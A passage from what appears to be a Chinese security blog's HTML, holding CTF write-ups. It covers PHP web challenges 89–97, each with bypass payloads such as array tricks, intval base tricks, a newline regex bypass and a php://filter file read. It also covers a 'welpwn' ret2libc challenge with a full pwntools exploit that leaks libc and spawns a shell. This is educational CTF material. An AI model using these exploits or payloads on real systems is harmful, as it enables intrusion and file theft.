+    <div class="post-body" itemprop="articleBody">
+          <h2 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>阅读代码发现满足条件的要求是自相矛盾的，$num既要是数字又不能是数字，所以此处我们使用<strong>数组绕过</strong></p>
+<p>payload：?num[]&#x3D;1</p>
+<h2 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><strong>知识点：弱类型（&#x3D;&#x3D;）与强类型（&#x3D;&#x3D;&#x3D;）比较</strong></p>
+<p><strong>1、弱类型（&#x3D;&#x3D;）</strong>：值相等，故在此比较过程中会出现问题；</p>
+<p>eg：若将‘0e’和0进行比较返回值为true原因是在比较时php将（字符串）0e转换为了（int）0在与0进行比较，故返回值为true；</p>
+<p><strong>2、强类型（&#x3D;&#x3D;&#x3D;）</strong>：值与类型均相等返回为真；</p>
+<p>eg：‘0’&#x3D;&#x3D;&#x3D;0   返回值为false，因为类型不已；</p>
+<p>payload：?num&#x3D;4476e</p>
+<h2 id="web-91-0a截断"><a href="#web-91-0a截断" class="headerlink" title="web 91(%0a截断)"></a>web 91(%0a截断)</h2><p>相关链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/110494387">https://blog.csdn.net/weixin_45551083/article/details/110494387</a></p>
+<p>考察PHP模式修饰符m (PCRE_MULTILINE)<br>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾，或者最后的换行符(除非设置了 D 修饰符)。</p>
+<p>当这个修饰符设置之后，”行首”和”行末”就会匹配目标字符串中任意换行符之前或之后</p>
+<p>当目标字符串中有换行符或者匹配中出现^或者$会受到影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>payload:1%0aphp</p>
+<h2 id="web-92"><a href="#web-92" class="headerlink" title="web 92"></a>web 92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>知识点</strong></p>
+<p><strong>intval()函数：如果$base为0则$var中存在字母的话遇到字母就停止读取</strong></p>
+<p><img src="/image-20220713153459536.png" alt="image-20220713153459536"></p>
+<p><em><strong>payload1</strong></em>：?num&#x3D;4476e123</p>
+<p>在php中有着科学计数的作用所以在进行弱类型比较时不会发生类型转换而是进行了计算，之后又因为intval()函数的特性获取flag</p>
+<p>进制绕过：</p>
+<p><em><strong>payload2</strong></em>：?num&#x3D;0x117c</p>
+<h2 id="web-93（进制绕过）"><a href="#web-93（进制绕过）" class="headerlink" title="web 93（进制绕过）"></a>web 93（进制绕过）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="comment">//检测num中是否存在字母</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以0开头将以八进制读取</p>
+<p>paylaod:?num&#x3D;010574</p>
+<h2 id="web-94"><a href="#web-94" class="headerlink" title="web 94"></a>web 94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>在web93的基础上禁用了以0开头的数据，但是由于使用&#x3D;&#x3D;&#x3D;所以我们输入小数，通过类型不一绕过，在使用intval将其转换为int型；</p>
+<p>payload：?num&#x3D;4476.0</p>
+<p>payload：?num&#x3D;%20010574</p>
+<p>payload：?num&#x3D;%2b010574</p>
+<h2 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>知识点</strong></p>
+<p>strpos() :函数查找字符串在另一字符串中第一次出现的位置。</p>
+<p>故此题strpos()返回不为0即可，所以可以用空格（%20）和加号（%2b）进行干扰</p>
+<p>payload：?num&#x3D;%20010574</p>
+<p>payload：?num&#x3D;%2b010574</p>
+<h2 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一开始以为考点是通配符所以经过了*，？的一番尝试之后发现不对一直报错</p>
+<p><img src="/image-20220713160253070.png" alt="image-20220713160253070"></p>
+<p>仔细观察报错路径，凭借极少且不风骚的经验猜测是linux下，所以一般flag存放在根目录下经过尝试获得flag</p>
+<p>payload：?u&#x3D;.&#x2F;flag</p>
+<p>一些其他的payload：</p>
+<p>?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p>
+<p>?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
+<p>对伪协议的理解不透彻只有在使用file_get_content()时候才想的起来使用，所以 卡了很久；</p>
+<h2 id="web-97-md5绕过"><a href="#web-97-md5绕过" class="headerlink" title="web 97 (md5绕过)"></a>web 97 (md5绕过)</h2><p>相关文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">(19条消息) 总结ctf中 MD5 绕过的一些思路_yจุ๊บng的博客-CSDN博客_ctf md5绕过</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>此题我使用的是数组绕过，MD5碰撞也可以绕过有兴趣的小伙伴们也可以试一试;</p>
+<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2 </p>
+<p>注意此图需要使用post传值</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_welpwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_welpwn/" class="post-title-link" itemprop="url">welpwn</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-13 22:34:00 / 修改时间：22:37:37" itemprop="dateCreated datePublished" datetime="2022-07-13T22:34:00+08:00">2022-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">攻防世界刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道ret2libc，但是涉及相邻两个栈帧的利用。</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/image-20220713205355908.png" alt="image-20220713205355908"></p>
+<p>可以说是保护基本没开</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><img src="/image-20220713205552851.png" alt="image-20220713205552851"></p>
+<p>可以看到read控制的字节长度刚刚好，所以就不构成溢出，main函数没什么问题，主要就是从输入流向buf写入数据，跟进看看echo。</p>
+<h3 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h3><p><img src="/image-20220713205704666.png" alt="image-20220713205704666"></p>
+<p>从main函数可以看到程序将我们第一次写的buf作为参数传入echo函数，然后有个for循环，这个循环仔细看可以知道，<code>*(_BYTE *)(i + a1)</code>其实对应的就是传入的buf地址上的内容，每循环一次就从buf地址向其高地址偏移一个字节，直到碰到某个地址上没内容或者为<code>\0</code>就退出循环。所以这个函数的大致功能就是：<strong>将buf上的内容逐个字节复制到s2中，遇到’\0’退出</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为我们能向<code>buf</code>写入<code>0x400</code>的数据，但<code>s2</code>的大小只有<code>0x10</code>，所以复制数据的时候可能就会导致栈溢出，但是这个栈溢出并不能直接利用。</p>
+<p>假如我们的payload是像如下所示泄露真实地址：</p>
+<p><code>payload = b&#39;a&#39;*0x18 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr) </code></p>
+<p>因为p64()函数打包的地址如果不是16位都是非0的话，结果就一定会出现<code>\0</code>，如下图所示</p>
+<p><img src="/image-20220713212013671.png" alt="image-20220713212013671"></p>
+<p>虽然小端序输入能保证当时这个地址还有效（能成功复制进s2），但是后面的地址就会被截断。</p>
+<p>所以攻击姿势得变通一下:</p>
+<p>因为<code>buf</code>和<code>s2</code>刚好在两个相邻的栈帧上，虽然复制的时候后面的地址会被截断导致复制不到“<code>s2</code>里”，但是它们在main函数里已经就被我们写入到了<code>buf</code>上，所以它们还是在栈上，栈中情况如下图所示。</p>
+<p><img src="/%E6%A0%881.jpg" alt="栈1"></p>
+<blockquote>
+<p>上图中的“ebp”改为“rbp”</p>
+</blockquote>
+<p>如果直接发送上诉payload的话，栈中情况如上图所示。从上图可看出，程序一开始依然能够正常执行<code>pop rdi</code>指令，但是接着执行下去，栈中的内容是<code>aaaaaaaaa</code>，这并不是个合法地址，所以会导致程序崩溃。</p>
+<p>但是我们可以将echo函数的返回地址改为一个pop gadget的地址，这个地址上得有多个连续的pop指令和return指令，因为这样才能让我们把合法地址“上面”的<code>aaaaaaaa</code>给pop掉然后返回栈上继续执行，如下图所示</p>
+<p><img src="/image-20220713220859723.png" alt="image-20220713220859723"></p>
+<p>我们选择<code>0x40089c</code>这个地址，因为<code>0x18</code>的垃圾数据加上pop指令的本身地址，总共要pop <code>0x20</code>大小的数据，所以要pop 4次。这是payload为：</p>
+<p><code>payload = b&quot;a&quot; * 0x18 + p64(pop_4) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</code></p>
+<p>栈中情况如下图所示：</p>
+<p><img src="/%E6%A0%882.jpg" alt="栈2"></p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">49653</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./welpwn&#x27;)</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi = <span class="number">0x4008a1</span></span><br><span class="line">pop_4 = <span class="number">0x40089c</span></span><br><span class="line">main_addr = <span class="number">0x4007CD</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Welcome to RCTF\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(pop_4) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;\x40&#x27;</span>))</span><br><span class="line">puts_addr = u64(r.recvline(keepends=<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x6f690</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> +p64(pop_4) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题其实就是考查对栈结构的理解，相比普通的ret2libc，这题涉及相邻两个栈帧的利用。然后要注意程序的小端序输入，这保证了第一个地址的有效性，也保证了后续利用。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://eur1ka.github.io/2022/07/12/embryoio%20level36~level59/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eureka's Blog">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Eureka's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
